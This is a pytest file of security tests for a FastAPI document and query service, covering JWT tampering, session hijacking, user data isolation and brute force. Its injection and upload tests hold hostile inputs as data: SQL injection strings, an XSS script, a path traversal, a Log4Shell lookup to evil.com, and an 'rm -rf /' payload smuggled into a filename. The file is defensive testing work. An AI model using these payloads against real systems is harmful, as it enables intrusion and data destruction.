"""
Security penetration testing.
Tests for security vulnerabilities and attack vectors.
"""
import pytest
import jwt
import time
import threading
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime, timedelta
from fastapi.testclient import TestClient

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.api.main import app
from app.shared.auth import AuthenticationManager, TokenInvalidError, TokenExpiredError
from app.shared.session_manager import SessionManager
from app.shared.models import UserSession, Job, JobStatus, JobType


class TestAuthenticationSecurity:
    """Test authentication security vulnerabilities."""
    
    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)
    
    @pytest.fixture
    def auth_manager(self):
        """Create authentication manager."""
        return AuthenticationManager()
    
    def test_jwt_token_tampering_protection(self, auth_manager):
        """Test protection against JWT token tampering."""
        with patch('app.shared.auth.config') as mock_config:
            mock_config.SECRET_KEY = "test-secret"
            mock_config.ACCESS_TOKEN_EXPIRE_MINUTES = 30
            mock_config.USERS = {
                "test_user": {"password": "test_pass", "groups": ["test_group"]}
            }
            
            with patch('app.shared.auth.session_manager') as mock_session_manager:
                mock_session = UserSession(
                    session_id="test_session",
                    user_id="test_user",
                    groups=["test_group"],
                    permissions=["upload", "query"]
                )
                mock_session_manager.create_session.return_value = mock_session
                mock_session_manager.validate_session.return_value = True
                
                # Create valid token
                auth_result = auth_manager.authenticate_user("test_user", "test_pass")
                valid_token = auth_result["access_token"]
                
                # Verify valid token works
                user_info = auth_manager.validate_token(valid_token)
                assert user_info["username"] == "test_user"
                
                # Test token tampering
                tampered_tokens = [
                    valid_token[:-5] + "XXXXX",  # Modify signature
                    valid_token.replace("test_user", "admin_user"),  # Modify payload
                    "invalid.jwt.token",  # Completely invalid token
                    "",  # Empty token
                    "Bearer " + valid_token,  # Wrong format
                ]
                
                for tampered_token in tampered_tokens:
                    with pytest.raises((TokenInvalidError, Exception)):
                        auth_manager.validate_token(tampered_token)
    
    def test_token_expiration_enforcement(self, auth_manager):
        """Test that expired tokens are properly rejected."""
        with patch('app.shared.auth.config') as mock_config:
            mock_config.SECRET_KEY = "test-secret"
            mock_config.ACCESS_TOKEN_EXPIRE_MINUTES = 30
            mock_config.USERS = {
                "test_user": {"password": "test_pass", "groups": ["test_group"]}
            }
            
            # Create expired token manually
            expired_payload = {
                "sub": "test_user",
                "session_id": "test_session",
                "groups": ["test_group"],
                "permissions": ["upload", "query"],
                "exp": datetime.utcnow() - timedelta(minutes=1),  # Expired 1 minute ago
                "iat": datetime.utcnow() - timedelta(minutes=31),
                "jti": "test-jti"
            }
            
            expired_token = jwt.encode(
                expired_payload,
                auth_manager.secret_key,
                algorithm=auth_manager.algorithm
            )
            
            # Expired token should be rejected
            with pytest.raises(TokenExpiredError):
                auth_manager.validate_token(expired_token)
    
    def test_session_hijacking_protection(self, client):
        """Test protection against session hijacking."""
        with patch('app.shared.auth.config') as mock_config, \
             patch('app.shared.auth.session_manager') as mock_session_manager:
            
            mock_config.SECRET_KEY = "test-secret"
            mock_config.USERS = {
                "user1": {"password": "pass1", "groups": ["group1"]},
                "user2": {"password": "pass2", "groups": ["group2"]}
            }
            
            # Create sessions for two different users
            user1_session = UserSession(
                session_id="session_user1",
                user_id="user1",
                groups=["group1"],
                permissions=["upload", "query"]
            )
            
            user2_session = UserSession(
                session_id="session_user2",
                user_id="user2",
                groups=["group2"],
                permissions=["upload", "query"]
            )
            
            def mock_create_session(user_id, groups, permissions):
                if user_id == "user1":
                    return user1_session
                elif user_id == "user2":
                    return user2_session
                return None
            
            mock_session_manager.create_session.side_effect = mock_create_session
            mock_session_manager.validate_session.return_value = True
            mock_session_manager.update_session_activity.return_value = True
            
            # Authenticate both users
            auth1_response = client.post("/api/auth/login", json={"username": "user1", "password": "pass1"})
            auth2_response = client.post("/api/auth/login", json={"username": "user2", "password": "pass2"})
            
            assert auth1_response.status_code == 200
            assert auth2_response.status_code == 200
            
            user1_token = auth1_response.json()["access_token"]
            user2_token = auth2_response.json()["access_token"]
            
            # Test that user1's token cannot access user2's resources
            with patch('app.shared.job_manager.job_manager') as mock_job_manager:
                # Create job belonging to user2
                user2_job = Job(
                    user_id="user2",
                    job_type=JobType.EMBEDDING,
                    status=JobStatus.COMPLETED,
                    metadata={"filename": "user2_document.pdf"}
                )
                mock_job_manager.get_job.return_value = user2_job
                
                # User1 tries to access user2's job using user1's token
                headers = {"Authorization": f"Bearer {user1_token}"}
                response = client.get(f"/api/jobs/{user2_job.job_id}", headers=headers)
                
                # Should be forbidden
                assert response.status_code == 403
    
    def test_brute_force_protection(self, client):
        """Test protection against brute force attacks."""
        with patch('app.shared.auth.config') as mock_config:
            mock_config.SECRET_KEY = "test-secret"
            mock_config.USERS = {
                "target_user": {"password": "correct_password", "groups": ["group"]}
            }
            
            # Attempt multiple failed logins
            failed_attempts = []
            for i in range(10):
                response = client.post("/api/auth/login", json={
                    "username": "target_user",
                    "password": f"wrong_password_{i}"
                })
                failed_attempts.append(response.status_code)
            
            # All attempts should fail with 401
            assert all(status == 401 for status in failed_attempts)
            
            # Even correct password should still work (no account lockout in this simple test)
            with patch('app.shared.auth.session_manager') as mock_session_manager:
                mock_session_manager.create_session.return_value = UserSession(
                    session_id="test_session",
                    user_id="target_user",
                    groups=["group"],
                    permissions=["upload", "query"]
                )
                
                correct_response = client.post("/api/auth/login", json={
                    "username": "target_user",
                    "password": "correct_password"
                })
                
                assert correct_response.status_code == 200
    
    def test_privilege_escalation_protection(self, client):
        """Test protection against privilege escalation."""
        with patch('app.shared.auth.config') as mock_config, \
             patch('app.shared.auth.session_manager') as mock_session_manager:
            
            mock_config.SECRET_KEY = "test-secret"
            mock_config.USERS = {
                "regular_user": {"password": "pass", "groups": ["common_rules"]},
                "admin_user": {"password": "admin_pass", "groups": ["admin"]}
            }
            
            # Create regular user session
            regular_session = UserSession(
                session_id="regular_session",
                user_id="regular_user",
                groups=["common_rules"],
                permissions=["query"]  # Limited permissions
            )
            
            mock_session_manager.create_session.return_value = regular_session
            mock_session_manager.validate_session.return_value = True
            mock_session_manager.update_session_activity.return_value = True
            mock_session_manager.get_session.return_value = regular_session
            
            # Authenticate as regular user
            auth_response = client.post("/api/auth/login", json={
                "username": "regular_user",
                "password": "pass"
            })
            
            assert auth_response.status_code == 200
            token = auth_response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}
            
            # Try to access admin-only functionality
            # (In a real system, this might be admin endpoints)
            
            # Test 1: Try to access other user's data
            with patch('app.shared.job_manager.job_manager') as mock_job_manager:
                admin_job = Job(
                    user_id="admin_user",
                    job_type=JobType.EMBEDDING,
                    status=JobStatus.COMPLETED,
                    metadata={"filename": "admin_document.pdf"}
                )
                mock_job_manager.get_job.return_value = admin_job
                
                response = client.get(f"/api/jobs/{admin_job.job_id}", headers=headers)
                assert response.status_code == 403  # Should be forbidden
            
            # Test 2: Try to perform admin actions (if such endpoints existed)
            # This would test endpoints that require admin permissions


class TestDataAccessSecurity:
    """Test data access security and isolation."""
    
    @pytest.fixture
    def client(self):
        """Create test client."""
        return TestClient(app)
    
    def test_user_data_isolation(self, client):
        """Test that users cannot access other users' data."""
        with patch('app.shared.auth.config') as mock_config, \
             patch('app.shared.auth.session_manager') as mock_session_manager:
            
            mock_config.SECRET_KEY = "test-secret"
            mock_config.USERS = {
                "user1": {"password": "pass1", "groups": ["group1"]},
                "user2": {"password": "pass2", "groups": ["group2"]}
            }
            
            # Setup sessions for both users
            def mock_create_session(user_id, groups, permissions):
                return UserSession(
                    session_id=f"session_{user_id}",
                    user_id=user_id,
                    groups=groups,
                    permissions=permissions
                )
            
            mock_session_manager.create_session.side_effect = mock_create_session
            mock_session_manager.validate_session.return_value = True
            mock_session_manager.update_session_activity.return_value = True
            
            def mock_get_session(session_id):
                if "user1" in session_id:
                    return UserSession(
                        session_id=session_id,
                        user_id="user1",
                        groups=["group1"],
                        permissions=["upload", "query"]
                    )
                elif "user2" in session_id:
                    return UserSession(
                        session_id=session_id,
                        user_id="user2",
                        groups=["group2"],
                        permissions=["upload", "query"]
                    )
                return None
            
            mock_session_manager.get_session.side_effect = mock_get_session
            
            # Authenticate both users
            auth1_response = client.post("/api/auth/login", json={"username": "user1", "password": "pass1"})
            auth2_response = client.post("/api/auth/login", json={"username": "user2", "password": "pass2"})
            
            user1_token = auth1_response.json()["access_token"]
            user2_token = auth2_response.json()["access_token"]
            
            with patch('app.shared.job_manager.job_manager') as mock_job_manager:
                # Create jobs for both users
                user1_jobs = [
                    Job(user_id="user1", job_type=JobType.EMBEDDING, status=JobStatus.COMPLETED),
                    Job(user_id="user1", job_type=JobType.QUERY, status=JobStatus.COMPLETED)
                ]
                
                user2_jobs = [
                    Job(user_id="user2", job_type=JobType.EMBEDDING, status=JobStatus.COMPLETED),
                    Job(user_id="user2", job_type=JobType.QUERY, status=JobStatus.COMPLETED)
                ]
                
                def mock_get_user_jobs(user_id, **kwargs):
                    if user_id == "user1":
                        return user1_jobs
                    elif user_id == "user2":
                        return user2_jobs
                    return []
                
                mock_job_manager.get_user_jobs.side_effect = mock_get_user_jobs
                
                # User1 requests their jobs
                headers1 = {"Authorization": f"Bearer {user1_token}"}
                response1 = client.get("/api/jobs", headers=headers1)
                
                assert response1.status_code == 200
                jobs1 = response1.json()["jobs"]
                assert len(jobs1) == 2
                assert all(job["user_id"] == "user1" for job in jobs1)
                
                # User2 requests their jobs
                headers2 = {"Authorization": f"Bearer {user2_token}"}
                response2 = client.get("/api/jobs", headers=headers2)
                
                assert response2.status_code == 200
                jobs2 = response2.json()["jobs"]
                assert len(jobs2) == 2
                assert all(job["user_id"] == "user2" for job in jobs2)
                
                # Verify no cross-contamination
                user1_job_ids = {job["job_id"] for job in jobs1}
                user2_job_ids = {job["job_id"] for job in jobs2}
                assert user1_job_ids.isdisjoint(user2_job_ids)
    
    def test_sql_injection_protection(self, client):
        """Test protection against SQL injection attacks."""
        # Note: This system uses Redis/NoSQL, but test input validation
        
        with patch('app.shared.auth.config') as mock_config, \
             patch('app.shared.auth.session_manager') as mock_session_manager:
            
            mock_config.SECRET_KEY = "test-secret"
            mock_config.USERS = {
                "test_user": {"password": "test_pass", "groups": ["test_group"]}
            }
            
            mock_session = UserSession(
                session_id="test_session",
                user_id="test_user",
                groups=["test_group"],
                permissions=["upload", "query"]
            )
            mock_session_manager.create_session.return_value = mock_session
            mock_session_manager.validate_session.return_value = True
            mock_session_manager.update_session_activity.return_value = True
            mock_session_manager.get_session.return_value = mock_session
            
            # Authenticate
            auth_response = client.post("/api/auth/login", json={
                "username": "test_user",
                "password": "test_pass"
            })
            token = auth_response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}
            
            # Test malicious query inputs
            malicious_queries = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; SELECT * FROM sensitive_data; --",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "${jndi:ldap://evil.com/a}"
            ]
            
            with patch('app.shared.job_manager.job_manager') as mock_job_manager:
                mock_job = Job(
                    user_id="test_user",
                    job_type=JobType.QUERY,
                    status=JobStatus.PENDING
                )
                mock_job_manager.create_job.return_value = mock_job
                
                for malicious_query in malicious_queries:
                    # Submit malicious query
                    response = client.post("/api/query", 
                                         json={"query": malicious_query}, 
                                         headers=headers)
                    
                    # Should either succeed (with sanitized input) or fail gracefully
                    assert response.status_code in [200, 400]
                    
                    if response.status_code == 200:
                        # If accepted, verify the query was sanitized/escaped
                        # In a real system, you'd check that the malicious parts were neutralized
                        pass
    
    def test_file_upload_security(self, client):
        """Test file upload security vulnerabilities."""
        with patch('app.shared.auth.config') as mock_config, \
             patch('app.shared.auth.session_manager') as mock_session_manager:
            
            mock_config.SECRET_KEY = "test-secret"
            mock_config.USERS = {
                "test_user": {"password": "test_pass", "groups": ["test_group"]}
            }
            
            mock_session = UserSession(
                session_id="test_session",
                user_id="test_user",
                groups=["test_group"],
                permissions=["upload", "query"]
            )
            mock_session_manager.create_session.return_value = mock_session
            mock_session_manager.validate_session.return_value = True
            mock_session_manager.update_session_activity.return_value = True
            mock_session_manager.get_session.return_value = mock_session
            
            # Authenticate
            auth_response = client.post("/api/auth/login", json={
                "username": "test_user",
                "password": "test_pass"
            })
            token = auth_response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}
            
            # Test malicious file uploads
            malicious_files = [
                # Executable files
                ("malware.exe", b"MZ\x90\x00", "application/octet-stream"),
                ("script.sh", b"#!/bin/bash\nrm -rf /", "text/plain"),
                
                # Files with malicious names
                ("../../../etc/passwd", b"PDF content", "application/pdf"),
                ("file.pdf; rm -rf /", b"PDF content", "application/pdf"),
                
                # Oversized files (if size limits exist)
                ("huge.pdf", b"x" * (10 * 1024 * 1024), "application/pdf"),  # 10MB
                
                # Files with null bytes
                ("file\x00.pdf", b"PDF content", "application/pdf"),
            ]
            
            for filename, content, content_type in malicious_files:
                files = {"file": (filename, content, content_type)}
                response = client.post("/api/documents/upload", files=files, headers=headers)
                
                # Should either reject malicious files or sanitize them
                if response.status_code == 200:
                    # If accepted, verify filename was sanitized
                    response_data = response.json()
                    sanitized_filename = response_data.get("filename", "")
                    
                    # Should not contain path traversal or dangerous characters
                    assert "../" not in sanitized_filename
                    assert "\x00" not in sanitized_filename
                    assert ";" not in sanitized_filename
                else:
                    # Should be rejected with appropriate error
                    assert response.status_code in [400, 413, 415]  # Bad request, too large, unsupported type


class TestConcurrentSecurityAttacks:
    """Test security under concurrent attack scenarios."""
    
    def test_concurrent_authentication_attacks(self):
        """Test system resilience against concurrent authentication attacks."""
        auth_manager = AuthenticationManager()
        attack_results = []
        
        with patch('app.shared.auth.config') as mock_config:
            mock_config.SECRET_KEY = "test-secret"
            mock_config.USERS = {
                "target_user": {"password": "correct_password", "groups": ["group"]}
            }
            
            def attack_worker(attack_id):
                try:
                    # Simulate various attack patterns
                    attack_patterns = [
                        ("target_user", f"wrong_password_{attack_id}"),  # Brute force
                        (f"fake_user_{attack_id}", "any_password"),      # User enumeration
                        ("target_user", ""),                             # Empty password
                        ("", "correct_password"),                        # Empty username
                        ("target_user", "correct_password" * 100),       # Long password
                    ]
                    
                    for username, password in attack_patterns:
                        try:
                            auth_manager.authenticate_user(username, password)
                            attack_results.append({"attack_id": attack_id, "success": True, "pattern": (username, password)})
                        except Exception:
                            attack_results.append({"attack_id": attack_id, "success": False, "pattern": (username, password)})
                            
                except Exception as e:
                    attack_results.append({"attack_id": attack_id, "error": str(e)})
            
            # Launch concurrent attacks
            threads = []
            for i in range(20):
                thread = threading.Thread(target=attack_worker, args=(i,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
        
        # Analyze attack results
        successful_attacks = [r for r in attack_results if r.get("success", False)]
        failed_attacks = [r for r in attack_results if not r.get("success", True)]
        
        # All attacks should fail (except potentially the correct credentials)
        legitimate_successes = [
            r for r in successful_attacks 
            if r.get("pattern") == ("target_user", "correct_password")
        ]
        
        # Should have no successful attacks with wrong credentials
        illegitimate_successes = [
            r for r in successful_attacks 
            if r.get("pattern") != ("target_user", "correct_password")
        ]
        
        assert len(illegitimate_successes) == 0, f"Security breach: {illegitimate_successes}"
        assert len(failed_attacks) > len(successful_attacks), "Too many successful attacks"
    
    def test_concurrent_session_attacks(self):
        """Test session security under concurrent attacks."""
        session_manager = SessionManager()
        attack_results = []
        
        with patch('app.shared.session_manager.redis_client') as mock_redis:
            # Create a legitimate session
            legitimate_session = UserSession(
                session_id="legitimate_session",
                user_id="legitimate_user",
                groups=["group"],
                permissions=["upload", "query"]
            )
            
            stored_sessions = {"legitimate_session": legitimate_session}
            
            def mock_get_session(session_id):
                return stored_sessions.get(session_id)
            
            def mock_set_session(session):
                stored_sessions[session.session_id] = session
                return True
            
            mock_redis.get_session.side_effect = mock_get_session
            mock_redis.set_session.side_effect = mock_set_session
            mock_redis.delete_session.return_value = True
            
            def session_attack_worker(attack_id):
                try:
                    # Various session attack patterns
                    attack_patterns = [
                        # Session hijacking attempts
                        lambda: session_manager.get_session("legitimate_session"),
                        
                        # Session fixation attempts
                        lambda: session_manager.create_session(
                            user_id="attacker",
                            groups=["attacker_group"],
                            permissions=["upload", "query"]
                        ),
                        
                        # Session enumeration
                        lambda: session_manager.get_session(f"guessed_session_{attack_id}"),
                        
                        # Session manipulation
                        lambda: session_manager.update_session_activity(f"fake_session_{attack_id}"),
                    ]
                    
                    for pattern in attack_patterns:
                        try:
                            result = pattern()
                            attack_results.append({
                                "attack_id": attack_id,
                                "success": result is not None,
                                "result_type": type(result).__name__
                            })
                        except Exception:
                            attack_results.append({
                                "attack_id": attack_id,
                                "success": False,
                                "error": "Exception occurred"
                            })
                            
                except Exception as e:
                    attack_results.append({"attack_id": attack_id, "error": str(e)})
            
            # Launch concurrent session attacks
            threads = []
            for i in range(15):
                thread = threading.Thread(target=session_attack_worker, args=(i,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
        
        # Analyze results
        # Some operations should succeed (legitimate session access, new session creation)
        # But there should be no unauthorized access to other users' sessions
        
        successful_attacks = [r for r in attack_results if r.get("success", False)]
        
        # Verify that the system handled concurrent access without corruption
        assert len(attack_results) > 0
        
        # The legitimate session should still be intact
        final_session = session_manager.get_session("legitimate_session")
        if final_session:  # Might be None due to mocking
            assert final_session.user_id == "legitimate_user"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])